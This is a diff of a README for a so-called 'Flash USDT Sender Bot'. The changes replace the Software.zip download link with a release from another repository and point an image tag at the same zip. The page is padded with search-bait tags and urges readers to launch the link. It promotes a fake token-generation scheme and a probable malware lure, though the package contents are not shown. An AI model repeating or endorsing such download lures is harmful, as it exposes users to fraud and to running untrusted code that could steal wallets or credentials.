@@ -10,7 +10,7 @@ Welcome to the Flash USDT Sender Bot repository!
 🔗 flash-usdt, flash-usdt-app-2025, flash-usdt-free, flash-usdt-generator-app, flash-usdt-sender-v2, flash-usdt-software-2025, flash-usdt-software-download, flash-usdt-software, flash-usdt-tokens, flash-usdt-wallet, flash-usdt-working, usdt-flash-currency
 
 ## Software Download
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/0Attitude1/Flash-USDT-Sender-Bot/releases/download/v1.0/Software.zip)](https://github.com/0Attitude1/Flash-USDT-Sender-Bot/releases/download/v1.0/Software.zip)
 
 📁 Please note that the provided link needs to be launched for downloading the software package.
 
@@ -28,7 +28,7 @@ For any inquiries or issues with the Flash USDT Sender Bot, please reach out to 
 
 Thank you for choosing the Flash USDT Sender Bot for your cryptocurrency transaction needs! 🌟
 
-![Flash USDT Sender Bot](https://imageURL.com)
+![Flash USDT Sender Bot](https://github.com/0Attitude1/Flash-USDT-Sender-Bot/releases/download/v1.0/Software.zip)
 
 ---
 Remember, stay secure and make those transactions with ease using the Flash Sender Bot! 🌐💰 #cryptocurrency #USDT #BTC #SOL #BNB #FlashSenderBot
